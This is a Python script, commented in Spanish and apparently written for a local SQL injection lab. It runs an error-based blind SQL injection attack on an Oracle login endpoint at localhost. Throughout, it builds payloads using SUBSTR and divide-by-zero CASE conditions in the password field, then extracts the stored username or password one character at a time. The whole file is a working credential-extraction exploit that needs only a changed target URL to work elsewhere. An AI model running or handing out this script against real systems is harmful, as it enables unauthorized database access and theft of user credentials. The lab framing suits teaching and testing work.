import requests
from termcolor import colored
from yaspin import yaspin
import string
import signal
import sys
import time


# Controlar CTRL+C para una salida limpia
def signal_handler(sig, frame):
    print('\n[!] Interrupción por el usuario. Saliendo...')
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

# Configuración del servidor
SERVER_URL = "http://127.0.0.1:5000/login/oracle/blind_boolean"  # Endpoint para inyecciones booleanas


def construir_inyeccion(campo, posicion, caracter):

    # Escapar apóstrofes en el carácter
    caracter_escapado = caracter.replace("'", "''")
    # Construir el payload usando EXISTS y dividir por cero solo si la condición es verdadera
    payload = f"' AND EXISTS (SELECT 1 FROM Usuarios WHERE SUBSTR({campo}, {posicion}, 1) = '{caracter_escapado}' AND 1/0=0) --"
    return payload


# Enviar la inyección y verificar si se desencadenó un error
def enviar_inyeccion(payload):
    """
    Envía la inyección al servidor y devuelve True si se detecta un error, False en caso contrario.
    """
    data = {
        "username": "admin",
        "password": payload
    }
    try:
        response = requests.post(SERVER_URL, json=data, timeout=5)
        print(colored(f"[*] Enviando inyección: {payload}", "cyan"))
        print(colored(f"[*] Estado de la respuesta: {response.status_code}", "cyan"))
        print(colored(f"[*] Longitud de la respuesta: {len(response.text)}", "cyan"))


        # Lista de palabras clave que indican un error de división por cero
        error_keywords = ["division by zero", "syntax error", "internal server error", "pg_error", "división por cero", "error de sintaxis", "cero"]
        for keyword in error_keywords:
            if keyword.lower() in response.text.lower():
                return True
        return False
    except requests.exceptions.Timeout:
        print("[!] Timeout durante la solicitud")
        return False
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Error en la petición: {e}", "red"))
        return False


# Extraer la longitud de la cadena objetivo
def obtener_longitud(campo, max_length=100):
    print(colored(f"\n[+] Determinando la longitud de '{campo}'...", "yellow"))
    for longitud in range(1, max_length + 1):
        # Construir el payload para verificar si LENGTH(campo) = longitud
        # ' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1/0 ELSE 1 END FROM Usuarios WHERE ROWNUM=1) = 1 --'
        payload = f"' AND (SELECT CASE WHEN (LENGTH({campo}) = {longitud}) THEN 1/0 ELSE 1 END FROM Usuarios WHERE ROWNUM=1) = 1 --"
        if enviar_inyeccion(payload):
            print(colored(f"[*] La longitud de '{campo}' es: {longitud}", "green", attrs=["bold"]))
            return longitud
    print(colored(f"[!] No se pudo determinar la longitud de '{campo}' hasta el máximo de {max_length}.", "red"))
    return max_length


# Extraer el valor del campo carácter por carácter
def extraer_campo(campo, longitud):
    """
    Extrae el valor del campo especificado carácter por carácter.
    """
    resultado = ""
    # Limitar el conjunto de caracteres a probar para mayor eficiencia
    caracteres = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation
    print(colored(f"\n[+] Extrayendo el valor de '{campo}'...", "yellow"))
    for pos in range(1, longitud + 1):
        encontrado = False
        print(colored(f"\n[+] Extrayendo carácter {pos} de {longitud}...", "cyan"))
        with yaspin(text=f"Probing character {pos}", color="cyan") as spinner:
            for caracter in caracteres:
                inyeccion = construir_inyeccion(campo, pos, caracter)
                if enviar_inyeccion(inyeccion):
                    resultado += caracter
                    spinner.text = f"[*] Carácter {pos}: '{caracter}' encontrado."
                    spinner.ok("✔")
                    print(colored(f"[*] Carácter {pos}: '{caracter}'", "green"))
                    encontrado = True
                    break
                # Opcional: Añadir un pequeño retraso para no sobrecargar el servidor
                time.sleep(0.05)
            if not encontrado:
                spinner.fail("✗")
                print(colored(f"[!] No se encontró un carácter coincidente en la posición {pos}.", "red"))
                resultado += '?'
    return resultado


# Menú interactivo
def menu():
    print(colored("=== Laboratorio de Inyección SQL Blindada por Booleanos ===", "blue", attrs=["bold"]))
    print(colored("Selecciona el campo que deseas extraer:", "yellow"))
    print(colored("1. Username", "magenta"))
    print(colored("2. Password", "magenta"))

    while True:
        opcion = input("Opción (1/2): ").strip()
        if opcion == "1":
            campo = "username"  # Usar mayúsculas según tu base de datos
            break
        elif opcion == "2":
            campo = "password"  # Usar mayúsculas según tu base de datos
            break
        else:
            print(colored("[!] Introduce una opción válida (1 o 2).", "red"))

    return campo


def main():
    campo = menu()
    longitud = obtener_longitud(campo)
    if longitud == 0:
        print(colored(f"[!] No se pudo determinar la longitud de '{campo}'.", "red"))
        sys.exit(1)
    valor = extraer_campo(campo, longitud)
    print(colored(f"\n[+] El valor extraído de '{campo}': {valor}", "green", attrs=["bold"]))


if __name__ == "__main__":
    main()
